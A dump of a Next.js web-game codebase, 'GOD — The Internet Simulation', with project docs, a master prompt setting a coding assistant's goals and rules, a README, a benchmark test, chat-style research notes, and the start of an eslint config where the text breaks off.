# GOD codebase

## File tree
```
.env.example
.gitignore
CLAUDE.md
CLAUDE_PROMPT.md
README.md
bench/bench.test.ts
docs/research.md
eslint.config.mjs
next-env.d.ts
next.config.ts
package-lock.json
package.json
public/icon-192.png
public/icon-512.png
public/icon-maskable-512.png
qa/acceptance.mjs
qa/ai.mjs
qa/interact.mjs
qa/live.mjs
qa/perf.mjs
qa/rail.mjs
qa/smoke.mjs
screenshots/live-convo-1.png
screenshots/mobile-dashboard.png
screenshots/mobile-lounge.png
scripts/screenshots.mjs
src/app/api/chat/route.ts
src/app/apple-icon.png
src/app/globals.css
src/app/icon.svg
src/app/layout.tsx
src/app/manifest.ts
src/app/page.tsx
src/components/App.tsx
src/components/MemeImage.tsx
src/components/store.ts
src/components/ui.tsx
src/components/views/Alerts.tsx
src/components/views/Auth.tsx
src/components/views/Chirp.tsx
src/components/views/Dashboard.tsx
src/components/views/Events.tsx
src/components/views/GodMode.tsx
src/components/views/Lounge.tsx
src/components/views/News.tsx
src/components/views/Overlays.tsx
src/components/views/Platforms.tsx
src/components/views/Profile.tsx
src/components/views/Search.tsx
src/components/views/Settings.tsx
src/lib/live/client.ts
src/lib/live/prompt.ts
src/lib/persistence/kv.ts
src/lib/persistence/profiles.ts
src/lib/sim/avatar.ts
src/lib/sim/characters.ts
src/lib/sim/data.ts
src/lib/sim/engine.ts
src/lib/sim/events.ts
src/lib/sim/flavor.ts
src/lib/sim/format.ts
src/lib/sim/generator.ts
src/lib/sim/godlines.ts
src/lib/sim/godspeak.ts
src/lib/sim/grammar.ts
src/lib/sim/memes.ts
src/lib/sim/presence.ts
src/lib/sim/rng.ts
src/lib/sim/servers.ts
src/lib/sim/social.ts
src/lib/sim/style.ts
src/lib/sim/templates.ts
src/lib/sim/topics.ts
src/lib/sim/types.ts
src/lib/sim/undernet.ts
src/lib/sim/world.ts
tests/actions.test.ts
tests/consequences.test.ts
tests/determinism.test.ts
tests/helpers.ts
tests/live.test.ts
tests/memes.test.ts
tests/persistence.test.ts
tests/polish.test.ts
tests/presence.test.ts
tests/reaction.test.ts
tests/realism.test.ts
tests/undernet.test.ts
tsconfig.json
vitest.config.mts
CODEBASE.md
```

## .env.example
```example
GEMINI_API_KEY=
# optional: GEMINI_MODEL=, AI_GATEWAY_API_KEY=, AI_GATEWAY_MODEL=, AI_GATEWAY_FALLBACKS=

```

## .gitignore
```gitignore
node_modules
.next
*.tsbuildinfo
server.log
screenshots/video-tmp
*.tsbuildinfo
.vercel
PROGRESS.json

```

## CLAUDE.md
```md
# CLAUDE.md — GOD: The Internet Simulation

Single-player fictional internet where the player (@god) is the most famous person online. Next.js 16 + React 19 + TS + Tailwind v4. Everything runs in the browser (IndexedDB); the only server code is `src/app/api/chat/route.ts` (Gemini via `GEMINI_API_KEY`, else Vercel AI Gateway, else scripted fallback in the client).

## Commands
- `npm ci`, `npm run dev`, `npm test` (vitest), `npm run typecheck`, `npm run lint`, `npm run build && npm start` (port 3100)
- QA (needs a running server + Chrome; set `BASE=`): `node qa/smoke.mjs`, `qa/acceptance.mjs`, `qa/interact.mjs`, `qa/live.mjs`, `qa/ai.mjs`, `qa/perf.mjs`, `qa/rail.mjs` (currently hangs, fix it)
- Deploy: `vercel deploy --prod`; secret: `vercel env add GEMINI_API_KEY production`
- Debug URLs: `/?demo`, `/?seed=x`, `/?away=6h`

## Map
- Model: `src/lib/sim/types.ts`. World + `WORLD_VERSION` + migration: `src/lib/sim/world.ts`.
- Engine (10 s seeded slots, `processBucket`, `simulate`, `catchUp`, `ripple`, god actions): `src/lib/sim/engine.ts`.
- Reactions to god: `godspeak.ts`, `godlines.ts`, `presence.ts`. Characters/voice: `characters.ts`, `generator.ts`, `style.ts`, `templates.ts`, `social.ts`. Story: `undernet.ts`; guard: `flavor.ts`.
- Store, tick loop, saves, BroadcastChannel single-runner: `src/components/store.ts`. UI: `src/components/views/*` (Lounge.tsx is the chat).
- Live AI: `src/lib/live/client.ts` (budgets, persona, history, pickLead), `src/lib/live/prompt.ts`.
- Research on real chat behaviour: `docs/research.md`.

## Rules
- The Lounge has its own branding. Discord-like UX patterns are fine; no Discord trademarks, logos, assets, or a pixel-identical copy.
- All people, outlets and the gh0st crew are fictional. No real hacking content; all crew lines (and AI lines) pass `flavor.ts`. No impersonating real people.
- No on-screen sim tag; the only fictional note is in Settings > About.
- Changing the save shape means bumping `WORLD_VERSION`, adding a migration and a test.
- Keep the seeded engine deterministic; AI is an overlay in `src/lib/live/`.
- Small commits; run typecheck, lint and tests before each. Never commit `.env*` or keys.

See `CLAUDE_PROMPT.md` for the full goals and acceptance criteria.

```

## CLAUDE_PROMPT.md
```md
# Master prompt: make GOD — The Internet Simulation insanely good

Paste this into Claude (Claude Code or a Claude Project with the pack uploaded). The repo is attached. Read `CLAUDE.md` first, then the code. Do not start writing code until you have read the files listed in section 2.

---

## 0. Who you are working for and what this is

You are the lead engineer on **GOD — The Internet Simulation**, live at https://god-sim.vercel.app. It is a single-player fictional internet in which the player's character, **@god**, is the most famous person online. The world reacts to him all the time: fans "glaze" him, haters and rivals push back, news outlets cover him, a fictional hacker crew (gh0st and the Undernet) adds drama, and when the reactions boil over the world reaches a "breaking point".

The centrepiece is **the Lounge**, a Discord-inspired group chat app (servers, channels, DMs, threads, voice, reactions, pins, members list). Other in-world platforms: **Chirp** (X-like), **Snapgram**, **Clipz**, **Threadit**, **TubeVerse**, **Wire**, plus news outlets such as **GODWATCH**. There are also a dashboard, GOD MODE, random interactive events, and a catch-up summary of what happened while the player was away.

The player's main complaint: *"I can't actually have conversations with them, it doesn't feel real, they don't act like normal people."* Real AI replies already work in DMs and @mentions. Your job is to make the **whole** Lounge feel like a living, obsessed community of real people, and to polish everything else.

## 1. Hard rules (never break these)

1. **Original branding.** The Lounge is an original Discord-inspired chat app with its own name, logo, colours and visual identity. Familiar mobile chat UX patterns are fine (server rail, channel drawer, member list, message grouping, swipe gestures, long-press menus, bottom tab bar). Do **not** copy Discord's trademarks, logo, wordmark, Clyde/Wumpus, exact icon assets, sound files, or a pixel-identical layout or colour palette. The same applies to X, Instagram, TikTok, Reddit and YouTube for the other platforms.
2. **Fiction rules.** Every character, outlet, company and place is fictional. No real people are impersonated; celebrities in `Celebrity` data stay fictional. The gh0st crew and the Undernet are pure story: no real hacking commands, exploits, tools, IPs, URLs, credentials or personal-data patterns. `src/lib/sim/flavor.ts` (the flavor guard) stays, and **every AI-generated line from a crew member must pass through it** (and ideally every AI line in general). Extend its tests if you touch it.
3. **No on-screen simulation tag.** That is the player's choice. Keep exactly one fictional note, in Settings > About. Do not add banners, watermarks or "AI" badges on messages.
4. **Never break saves.** The world lives in the player's IndexedDB. Any change to the shape of `WorldState` needs `WORLD_VERSION` (in `src/lib/sim/world.ts`, currently 6) bumped and a migration step in the migrate function there, plus a test in `tests/persistence.test.ts` that loads an old-shaped world and checks it migrates.
5. **Never commit secrets.** The Gemini key lives only in the Vercel env var `GEMINI_API_KEY` (local: `.env.local`, which is gitignored). It is never sent to the browser, logged, or put in code, tests, or screenshots.
6. **Safety settings stay on** in the Gemini call. Characters can be rude, petty, cringe, and dramatic like real Discord users, but no sexual content, slurs, real-world harm instructions, or harassment of real people.

## 2. The codebase as it is today (read these)

**Stack:** Next.js 16 (App Router), React 19, TypeScript, Tailwind v4, `lucide-react` icons, the `ai` SDK (only for the AI Gateway fallback), vitest (+ `fake-indexeddb`), Playwright-core QA scripts driving system Chrome. About 7.7k lines in `src/`.

**Everything runs in the browser.** There is no server database. The only server code is `/api/chat`.

### Key files

| Path | Role |
|---|---|
| `src/app/page.tsx`, `layout.tsx`, `manifest.ts`, `globals.css` | Shell, PWA manifest, theme tokens |
| `src/components/App.tsx` | Top-level router (hash routes like `#/lounge/<server>/<channel>`), tab bar, layout |
| `src/components/store.ts` | Global store: boot, profiles, open/lock, the tick loop, debounced saves to IndexedDB, BroadcastChannel tab ownership (`god-sim:tabs`), `?demo`, `?seed=`, `?away=2h` debug params |
| `src/components/views/Lounge.tsx` | The Lounge UI (744 lines): rail, channels, messages, composer, threads, reactions, pins, members, voice, DMs |
| `src/components/views/*.tsx` | Chirp, Platforms (Snapgram/Clipz/Threadit/TubeVerse/Wire), News, Dashboard, GodMode, Events, Alerts, Search, Profile, Settings, Auth, Overlays (catch-up summary, breaking point, lightbox) |
| `src/components/ui.tsx`, `MemeImage.tsx` | Shared UI, generated meme rendering |
| `src/lib/sim/types.ts` | The data model: `WorldState`, `Character`, `Server`, `Channel`, `Message`, `Reaction`, `Post`, `Article`, `Outlet`, `Topic`, `Player`, `Holding`, `InteractiveEvent`, `Notification`, `UndernetState`, `VoiceState`, `GodMoment`, `CatchUpSummary` |
| `src/lib/sim/world.ts` | `createWorld(seed)`, `WORLD_VERSION`, migration, `charById` |
| `src/lib/sim/engine.ts` | The sim engine: `BUCKET = 10_000` ms slots, `processBucket`, `simulate`, `catchUp`, `summarize`, `runEpisode` (a conversation burst in a channel), `ripple` (world reaction to a god action), `applyAction`, `godSay/godEdit/godReact/godPin/godPost`, `resolveEvent`, queries (`channelMessages`, `typingIn`, `unreadIndex`, `reactionsAt`, `dmThreads`) |
| `src/lib/sim/godspeak.ts`, `godlines.ts` | How the world reacts when god speaks ("sup guys" -> chat explodes), intents |
| `src/lib/sim/presence.ts` | Typing indicators, voice channels, "omg he's typing", join/leave reactions |
| `src/lib/sim/characters.ts`, `generator.ts`, `style.ts`, `grammar.ts`, `templates.ts`, `topics.ts`, `memes.ts`, `avatar.ts`, `social.ts`, `servers.ts`, `events.ts`, `data.ts` | Seeded character generation (voice, slang, emojis, chronotype, tier, pfp style), text styling per voice, scripted templates, topics/heat, meme specs, avatars, obsession/stance and relationships, server/channel layout, interactive events |
| `src/lib/sim/rng.ts` | Seeded RNG: the world is deterministic for a seed and slot |
| `src/lib/sim/undernet.ts` | The Undernet server and gh0st crew storyline (roles: gh0st, kid, wren, broker, hype), `ensureUndernet` for old saves |
| `src/lib/sim/flavor.ts` | The flavor guard (regex rules: shell, operators, code, sql, paths, network, tools, secrets, email) |
| `src/lib/live/client.ts` | Client side of live AI: `persona()` builds the character card, `historyFor()` last 30 lines, `pickLead()` picks which scripted message gets replaced by a real one; budgets `LIVE_BUDGET = 400` calls per session, `PER_MIN = 30`, 600 ms min gap, 16 s timeout during which the character shows as typing; falls back to scripted lines on any failure |
| `src/lib/live/prompt.ts` | `instructions()`, `promptText()`, `sanitize()` (validates the request), `parseReply()` (JSON lines + `remember` facts) |
| `src/app/api/chat/route.ts` | Server route. If `GEMINI_API_KEY` is set: races the first two `GEMINI_MODEL` models (9 s), then tries backups one by one (3.5 s). Else Vercel AI Gateway (`AI_GATEWAY_MODEL`, `AI_GATEWAY_FALLBACKS`). Per-IP limit 30/min per instance, 24 KB body cap. Setup errors return 200 with a `code` so the client quietly switches to scripted mode |
| `src/lib/persistence/kv.ts`, `profiles.ts` | IndexedDB KV (db `god-sim`, store `kv`) with memory fallback; local profiles with salted SHA-256 passcodes |
| `docs/research.md` | Research on how real Discord users talk, name themselves and pick pfps. Use it |
| `tests/*.test.ts`, `bench/bench.test.ts` | vitest: determinism, persistence, actions, consequences, presence, reactions, realism, memes, undernet, live, polish; perf bench |
| `qa/*.mjs`, `scripts/screenshots.mjs` | Playwright scripts against a running server (`BASE=http://localhost:3100` default): smoke, acceptance, interact, live, ai, perf, rail |

### How the sim works

- Time moves in seeded 10-second slots. Each slot (`processBucket`) decides with the seeded RNG which characters are awake (chronotype + local hour), which channels get an episode, which posts/articles appear, and which events fire. Same seed and slot gives the same world.
- **Single runner:** only one tab per profile runs the tick. A new tab broadcasts `claim`; the old tab saves, stops and shows "elsewhere".
- **Catch-up:** on reopen, or when a background tab wakes up, `catchUp` replays missed slots in batches (compressed when the gap is large) and `summarize` builds the "while you were away" summary. Nothing runs while all tabs are closed.
- **God actions** (`applyAction`, `godSay` …) call `ripple`, which schedules reactions into `s.pending` with future timestamps, so they appear over time with typing indicators first.
- **Live AI** sits on top: when god speaks in a DM or @mentions/replies to someone, `pickLead` picks one scripted reply, the client asks `/api/chat`, and the real lines replace it. `remember` facts are saved on the character (`godFacts`) so they remember what you told them.

### Run, test, deploy

```bash
npm ci
cp .env.example .env.local   # put your own GEMINI_API_KEY in it (optional; without it, scripted replies)
npm run dev                  # http://localhost:3000
npm test                     # vitest
npm run typecheck && npm run lint
npm run build && npm start   # port 3100, used by qa scripts
node qa/smoke.mjs            # needs Chrome at /usr/bin/google-chrome (edit executablePath for your OS)
vercel env add GEMINI_API_KEY production   # once
vercel deploy --prod
```

Useful URLs: `/?demo` (auto profile), `/?demo&seed=abc`, `/?away=6h` (simulate being away), `#/lounge/godhq/godhq-general`.

## 3. Goals, in priority order, with acceptance criteria

### P1. AI group chatter in the channel you are looking at (budgeted)
- When the player is viewing a Lounge channel, the ambient conversation there is (partly) AI-written, using the same personas, recent history and current topics. Other channels stay scripted.
- Batch it: one call returns a short scene of 3–8 lines from 2–5 named characters, which the client schedules over time with typing indicators. Do not make one call per message.
- Budget: an explicit per-session and per-minute budget for ambient calls, separate from and lower priority than direct replies (direct replies must never be starved). Pause ambient calls when the tab is hidden or the player has been idle more than ~3 minutes. Show nothing to the user when the budget is spent; quietly fall back to scripted lines.
- **Accept:** in a 5-minute session in #general, at least 60% of visible lines were AI-written, no line repeats verbatim, it costs no more than ~25 calls, and turning off the key produces a working scripted chat with no errors.

### P2. Many characters replying and talking to each other
- When god says something in a server channel, 2–6 different characters react, and they reply to **each other**, not only to god (agreeing, arguing, dunking, "ratio", inside jokes, quoting with reply arrows).
- Friends back each other up; rivals and haters pick fights; lurkers rarely talk; power users dominate.
- **Accept:** "sup guys" in #general produces at least 4 distinct speakers within 20 s, at least 2 lines that use reply-to on another character's message, and at least one disagreement.

### P3. AI lines for presence moments
- Typing ("omg he's typing", "HE'S TYPING EVERYONE SHUT UP"), stopping typing without sending, joining voice (people pile into voice, screaming, "W", "he actually joined"), leaving voice, reacting to a message (that message's author freaks out, others pile on with the same emoji), pinning, editing and deleting ("he deleted it, i saw it").
- One cheap batched call per moment, with a scripted fallback that already exists in `presence.ts`/`godspeak.ts`. Debounce: a run of reactions within 3 s is one moment.
- **Accept:** each moment type produces a contextual reaction within 3 s (scripted instantly, AI swaps in if it is in time), and nothing fires twice for one moment.

### P4. Persistent memory, relationships and lives of their own
- Extend `Character` with: long-term memories (facts about god, about other characters, and about their own life), a relationship score with god and with key characters, mood, and a short "current life" state (exams, new job, breakup, a game they are grinding) that changes over days of sim time.
- Memories are summarised and capped (e.g. 20 per character) so prompts stay small. Characters bring things up later ("you said your dog was called biscuit"), hold grudges, and remember being ignored.
- Bump `WORLD_VERSION`, migrate, and test.
- **Accept:** tell a character a fact, close the tab, come back with `?away=1d`, and they still know it; a character god insulted is colder for days; at least 5 characters visibly mention their own life events over a day of sim time.

### P5. Memes and media
- Better generated memes (`memes.ts`, `MemeImage.tsx`): templates that use current topics and god's quotes, reaction images, fake screenshots of god's posts, sticker-like emoji spam, GIF-like animated CSS reactions. Original art only, no copyrighted meme images.
- AI can ask for a meme by returning a structured `meme` field the client renders.
- **Accept:** memes show up naturally (not every message), are readable on mobile, and open in the lightbox.

### P6. Mobile polish (primary device is a phone, ~390×844)
- Smooth 60 fps scrolling for long channels (virtualise or window messages; `channelMessages` limit is 120 now), stick-to-bottom with a "new messages" jump pill, swipe to open the drawer and members, long-press message menu, haptic-feeling animations, safe-area insets, keyboard that does not cover the composer, and fast cold start.
- Its own identity: a distinctive palette, logo and naming for the Lounge, consistent across the app.
- **Accept:** Lighthouse mobile performance at least 85, no layout shift when messages stream in, every control at least 44 px, and all `qa/*` scripts pass at 390×844.

### P7. Performance and robustness
- Catch-up after `?away=7d` finishes in under 2 s on a mid-range phone and keeps the save under a sensible size (prune old messages/posts by keeping summaries). Saves are debounced and never block typing. `bench/bench.test.ts` gets budgets that fail the test if exceeded.
- The AI route: keep the model race, add a short server cache per identical request, and keep secrets out of logs.

### P8. Fix `qa/rail.mjs` (it hangs)
- It strips the Undernet from a saved world (opening IndexedDB from a `/__blank` route page) and reloads to check that migration restores it. It hangs. Likely causes: the app's open IndexedDB connection blocks, the `onblocked`/`versionchange` path is not handled, the `getAllKeys` key match fails, or the `ready()` wait never matches. Make it deterministic: close the app's DB on `versionchange`, add timeouts to every wait, and exit non-zero with a clear message instead of hanging.
- **Accept:** `node qa/rail.mjs` finishes in under 60 s and passes, both locally and against the live URL.

### P9. Known issues to check
- Random scripted lines that make no sense in context (the player asked "why did you say 'I just made it rain cereal over port lumen'"). Tighten templates so scripted lines match the channel topic, and grep templates for nonsense.
- Characters must not sound like bots: no "As an AI", no perfect grammar from zoomers, no helpful assistant tone, no over-long replies. Use `docs/research.md` for realistic voice.
- The Undernet should be easy to find and enter for old saves (migration + one-time "DM gh0st_" tip).

## 4. How to work

- First write a short plan with the files you will touch per goal. Then work goal by goal, P1 first.
- Small, focused commits with clear messages. After each one: `npm run typecheck && npm run lint && npm test`. Run the relevant `qa/*.mjs` against `npm run build && npm start` for UI changes.
- Keep the engine deterministic: anything AI-driven lives in `src/lib/live/` and is applied as an overlay on top of the seeded world. Do not let AI calls change the RNG stream.
- Add tests for every new behaviour (prompt parsing, budget, migration, flavor guard on AI output, memory caps).
- Keep the prompt sent to the model short: persona card + capped memories + last ~30 lines. Responses are JSON; validate and clamp them in `parseReply`.
- Never commit `.env*`, keys, or tokens. Never print the key.
- At the end of each goal, give me a short summary: what changed, how to test it, and any trade-offs.

Start by reading `CLAUDE.md`, `src/lib/sim/types.ts`, `src/lib/sim/engine.ts`, `src/components/store.ts`, `src/lib/live/client.ts`, `src/lib/live/prompt.ts`, `src/app/api/chat/route.ts` and `src/components/views/Lounge.tsx`, then post your plan.

```

## README.md
```md
# GOD — The Internet Simulation

> **Fictional.** Every person, server, outlet, post, article and dollar amount in this app is
> procedurally generated. No real people, companies or platforms are depicted. There is no on-screen
> badge (by request); a one-line "fictional world" note lives in Settings.

You play **@god**: the internet's most-discussed, absurdly wealthy, controversial main character. A whole
fictional internet runs around you, 24/7.

## Features
- **Lounge** (chat servers): 20+ always-on servers with channels, mods, bots, member lists with local times,
  unread pips, typing indicators, threaded replies, reactions and @god pings. You can post as @god.
- **Glazing simulator:** every character holds a stance (worshipper, fan, skeptic, hater, memer, conspiracist,
  indifferent) and an opinion score that drifts with your actions. Servers have their own bias.
- **Platforms:** Chirp (trending, viral posts, quotes, replies, reposts, likes, verified, community notes,
  breaking), Snapgram, Clipz, Threadit, TubeVerse, Wire.
- **News:** GODWATCH, Internet Daily, Global Wealth Report, Crypto Insider, The Digital Times, Billionaire News
  Network. Articles have authors, times, reads, reactions and comments.
- **Empire dashboard:** net worth, cash, investments, income, holdings (businesses, properties, vehicles, jets,
  islands, coins…), followers, community size, reputation, influence, trend status, glaze meter, history chart.
- **GOD MODE:** 12 action types (buy an island, launch a coin, donate, start a feud…) with a cost slider; impact
  magnitude scales the ripple. Magnitude ≥ 7 is a **BREAKING POINT**: #1 trend, breaking news, Lounge chaos,
  influencer takes, memes and alerts all at once.
- **Random events** with choices and consequences, expiry timers and history.
- **Characters:** hundreds of generated people with archetype voices, profiles (personality, age, location,
  occupation, finances, opinion, relationships, style, memory) and original SVG avatars in weighted styles.
  Plenty of chatter is not about @god at all. See `docs/research.md`.
- Search, notifications, editable profiles, settings (activity, glaze ratio, drama), 4 themes, reduced motion,
  and reset universe.

## How the world keeps going while you're away
There is no server and no cron. The world is a **deterministic function of (seed, time)**: the engine steps in
10 s buckets, each seeded from `seed + bucket`. When you open the app, it replays every bucket since
`lastSeenAt` in chunks, showing a progress bar. Gaps over 24 h are compressed (sampled) so a month away still
loads fast. If you've been gone more than 10 minutes, a **"While you were away"** summary lists what changed:
deltas, highlights, trends and the loudest servers. The same seed and the same absence always produce the
same world.

## Persistence and auth
Everything stays in the browser, in **IndexedDB** (db `god-sim`, store `kv`). Profiles are local. Each one can
have an optional passcode, stored as a salted SHA-256 hash (WebCrypto). This is a convenience lock, not real
security. The world autosaves every few seconds and when the tab is hidden or closed.

## Content generator
`src/lib/sim/generator.ts` defines a `ContentGenerator` interface (`chat`, `post`, `article`). The shipped
implementation is purely template/grammar based. `setGenerator()` lets a future model-backed generator plug in.
The UI makes no AI claims.

## Dev
```bash
npm install
npm run dev            # http://localhost:3000
npm test               # vitest: determinism, catch-up, event consequences, variety
npm run build && npm start   # port 3100
npm run screenshots    # needs a running server; writes screenshots/
```
URL params: `?demo` auto-creates a demo profile; `?away=6h` simulates an absence (e.g. `?demo&away=6h`).

```

## bench/bench.test.ts
```ts
import { it } from "vitest";
import { appendFileSync } from "node:fs";
const log = (...a: unknown[]) => appendFileSync(process.env.BENCH_OUT ?? "/tmp/bench.txt", a.join(" ") + "\n");
import { createWorld } from "../src/lib/sim/world";
import { bootstrap, simulate, trending } from "../src/lib/sim/engine";
const T0 = Date.UTC(2026, 10, 4, 12);
it("bench", () => {
  let t = performance.now();
  const w = bootstrap(createWorld("demo-universe", T0), T0);
  log("bootstrap ms", (performance.now() - t).toFixed(0));
  for (const [lbl, gap] of [["10m", 6e5], ["6h", 216e5], ["3d", 2592e5]] as const) {
    const s = JSON.parse(JSON.stringify(w));
    t = performance.now(); let chunks = 0, worst = 0;
    for (;;) { const c = performance.now(); const r = simulate(s, T0 + gap, { maxBuckets: 240 }); worst = Math.max(worst, performance.now() - c); if (!r.processed) break; chunks++; }
    log(lbl, "catchup ms", (performance.now() - t).toFixed(0), "chunks", chunks, "worst chunk ms", worst.toFixed(1));
    if (lbl === "6h") {
      const json = JSON.stringify(s); log("world JSON KB", (json.length / 1024).toFixed(0), "msgs", s.messages.length, "pending", s.pending.length, "posts", s.posts.length, "chars", s.characters.length);
      t = performance.now(); for (let i = 0; i < 20; i++) simulate(s, T0 + gap + (i + 1) * 1000); log("tick sim avg ms", ((performance.now() - t) / 20).toFixed(2));
      t = performance.now(); for (let i = 0; i < 20; i++) trending(s, T0 + gap, 8); log("trending avg ms", ((performance.now() - t) / 20).toFixed(2));
      t = performance.now(); for (let i = 0; i < 5; i++) structuredClone(s); log("structuredClone avg ms", ((performance.now() - t) / 5).toFixed(1));
    }
  }
}, 120000);

```

## docs/research.md
```md
# Research notes: how real online communities talk

These notes drive the generators in `src/lib/sim/`. Every character, server, outlet and post in GOD is fictional. The research is only used for *statistical shape* (length, rhythm, style). No real person's content is copied.

## 1. Message length
- Discord chat messages are short. A community-analytics write-up puts the **average at about 7 words per message**, and new or low-engagement users average about **4** ([CommunityOne / ModX](https://luyilousia.medium.com/modx-bot-part-1-4-charts-to-track-your-discord-operations-369de940b921)).
- One user's 7-year Discord export: 720,259 words over 102,556 messages, again **≈7 words/message**. About 9% of messages had attachments ([bwhitta.com](https://bwhitta.com/discord-data-analysis)).
- A large anonymised dataset that merges self-replies shows a mean of 19 words per *exchange*, with a long right tail (skew ≈ 6) ([Discord-Dialogues, Hugging Face](https://huggingface.co/datasets/mookiezi/Discord-Dialogues)).
- **Generator rule:** sample a target length from a right-skewed (log-normal-ish) distribution with a median of about 6 words. Many messages are 1–3 words ("real", "LMAO", "wait what"). Occasionally someone writes a paragraph-long rant (analysts, haters, conspiracists).

## 2. Style: casing, punctuation, slang, emoji
- Gen Z texting style is mostly **no capitals and no full stops**, with heavy irony. Common shorthand: "fr / fr fr", "ong", "ngl", "bet", "mid", "no cap", "lowkey", "istg", "iykyk", "icl" (UK). **💀 has largely replaced 😂** for laughing, and 😭 can mean laughing *or* overwhelmed. 😂 and 👍 read as older or passive-aggressive ([Kaiwa guide](https://trykaiwa.com/blog/english-texting-shortcuts-guide-2026), [FunkyEnglish](https://funkyenglish.com/text-slang-meanings/), [OneAppleFall decoder](https://oneapplefall.com/ai-tools/text-slang-decoder/)).
- Reaction-emoji vocabulary: 💀 "I'm dead", 😭, 🔥, 🐐 (GOAT), 👀 (gossip), 🧢 (lie), 🤡 (fool), 💯 ([Internet Matters dictionary](https://www.internetmatters.org/resources/text-dictionary/), [FunkyEnglish](https://funkyenglish.com/text-slang-meanings/)).
- ALL CAPS means shouting or hype.
- **Generator rule:** each character gets a fixed *voice* (lowercase-zoomer, caps-hype, proper, millennial with 😂/lol, terse, boomer with "..." and full sentences, formal-analyst, emoji-heavy). Each also gets a personal slang set, 1–3 signature emojis, a typo rate and a catchphrase, so the same person sounds the same across days. Older characters (35+) skew to proper/boomer/millennial voices, younger ones to zoomer/lowercase.

## 3. Who talks: lurkers vs. power users
- Participation inequality: the **90-9-1 rule** says 90% lurk, 9% contribute sometimes and 1% create most content ([Nielsen Norman Group](https://www.nngroup.com/articles/participation-inequality/)). It is a rule of thumb ([ManagingCommunities](https://www.managingcommunities.com/2012/07/19/90-9-1-rule-and-participation-inequality/)). On Twitter, about **3 in 4** users were lurkers ([ACM WWW'19 companion](https://dl.acm.org/doi/fullHtml/10.1145/3308560.3316705)). Post counts fit a **Zipf / power curve** (98.6% variance explained) ([Internet Interventions 2014](https://doi.org/10.1016/j.invent.2014.09.003)).
- **Generator rule:** characters get an activity tier. About 70% are lurkers (weight 0.15), 22% regulars (weight 1) and 8% power users (weight 6–12), plus a Zipf-like jitter. Server member counts shown in the UI are much larger than the speaking cast, as in a real server.

## 4. When they talk: daily rhythm and timezones
- Twitter activity is lowest at night (**trough ≈ 04:30 local**), rises to a lunchtime peak, dips in the late afternoon and peaks again in the evening ([PMC 6590897](https://pmc.ncbi.nlm.nih.gov/articles/PMC6590897/)). Busiest hours have about **3× the volume** of the quietest ([Pingdom](https://www.pingdom.com/blog/in-depth-study-of-twitter-how-much-we-tweet-and-when/)).
- Users split into **morning types (peak ≈ 09:30) and evening types (peak ≈ 23:15)**, plus intermediate types ([Scientific Reports 2024](https://www.nature.com/articles/s41598-024-69447-8)).
- During the day, total volume changes mostly because each account posts more, and @mentions/replies rise in the evening ([Bruns et al., "One Day in the Life of a National Twittersphere"](https://snurb.info/files/2019/One%20Day%20in%20the%20Life%20of%20a%20National%20Twittersphere.pdf)).
- **Generator rule:** every character has a home timezone from their location and a chronotype (morning, evening or night-owl). Their chance of being online follows a bimodal daily curve in *their* local time. Global volume therefore follows who is awake: European evenings and US evenings are busy, and the hours around 09:00–11:00 UTC are quieter.

## 5. How they talk: bursts and threads, not independent lines
- Human communication is **bursty**: quick exchanges separated by long silences, with heavy-tailed gaps between messages ([Barabási, Nature 2005](https://www.nature.com/articles/nature03459)). Starting a conversation looks roughly random (Poisson), but the replies *inside* a conversation come in fast bursts ([Wu et al., PNAS 2010](https://www.pnas.org/doi/full/10.1073/pnas.1013140107)).
- Discord logs are full of reply chains and self-follow-ups, where one author fires off several short messages in a row. Datasets often merge these "self-replies" ([Discord-Dialogues](https://huggingface.co/datasets/mookiezi/Discord-Dialogues), [discord-message-extractor](https://github.com/rickeev/discord-message-extractor)).
- Channels are unequal: #general carries most of the traffic, and niche channels are quiet ([CommunityOne](https://luyilousia.medium.com/modx-bot-part-1-4-charts-to-track-your-discord-operations-369de940b921)).
- **Generator rule:** conversations start at a Poisson rate, scaled by the daily curve, topic heat and channel weight (general ≫ niche). Each one becomes an *episode*: an opener, then replies that quote or ping earlier speakers, with log-normal gaps of 2–90 s. Episodes include self-follow-up bursts ("wait", "nvm", "*typo fix"), pile-ons when the opener is spicy, friends backing each other, rivals arguing, occasional topic drift to world news or someone's personal life, and a moderator stepping in when the thread gets heated. Bot messages (level-ups, starboard) appear now and then.

## 6. Usernames and display names
- Discord's current system: a **unique, forced-lowercase @username**, 2–32 characters, limited to a–z, 0–9, `_` and `.` (no consecutive periods), plus a free-form **display name** with capitals, spaces, emoji and non-Latin characters that can change any time. Servers can also set per-server nicknames ([Discord Support](https://support.discord.com/hc/en-us/articles/12620128861463-New-Usernames-Display-Names), [Discord blog](https://discord.com/blog/usernames/), [GamerBolt rules summary](https://www.gamerbolt.com/discord-username-rules/)).
- **Generator rule:** handles mix the common patterns: `word_word`, `wordword`, `word.word`, `name` plus a birth year or short number, letter-swaps (`k1ra`), aesthetic soft words (`lunarsoftie`), `not`/`its`/`the`/`real` prefixes, legacy `xX_name_Xx` styles (only as display names now, since handles are lowercase), and doubled letters (`vvoid`). Display names differ from handles: capitalised real-ish first names, an emoji suffix, all-lowercase, or "name | tag".

## 7. Profile pictures
- Anime-style avatars are a dominant style. Pets, aesthetic/soft edits, Y2K icons, minimal icons, funny reaction images and matching avatars are also common. Small circular crops favour simple, high-contrast subjects ([Kuromi PFP guide](https://kuromipfp.com/cute-pfp-for-discord/)). Many accounts keep the **default avatar**, which moderators also associate with throwaway or bot accounts ([r/discordapp thread](https://www.reddit.com/r/discordapp/comments/v8fdrd/the_new_discord_default_profile_pictures/)).
- **Generator rule:** weighted styles: original anime-style illustrated faces 24%, default blob avatar 14%, pets (cat/dog/frog) 14%, aesthetic scenery 12%, pixel-art characters 9%, reaction/meme faces 8%, game-style helmet/robot 8%, monogram/initial 6%, abstract 5%. All are **procedurally drawn SVGs**: no photos of real people and no copyrighted characters or logos. Haters skew to default or meme pfps, crypto people to pixel/NFT-style, and influencers to aesthetic avatars.

## 8. Moderators and bots
- Moderators speak in a short, calm, procedural tone ("keep it civil", "moving this to #memes", "last warning"). Bots post formulaic messages (level-ups, polls, starboard).
- **Generator rule:** moderators come from the server's regulars, and they step in during heated episodes and on spam. Fictional bots (`Tally`, `Starboard+`) post templated system lines that are visually marked as bots.

```

## eslint.config.mjs
```mjs
import { defineConfig, globalIgnores } from "eslint/config";
import nextVitals from "eslint-config-next/core-web-vitals";
import nextTs from "eslint-config-next/typescript";

const eslintConfig = defineConfig([
  ...nextVitals,
  ...nextTs,
  {
    // Intentional reset-on-input-change patterns (fetch state, debounced search).
    rules: { "react-hooks/set-state-in-effect": "warn" },
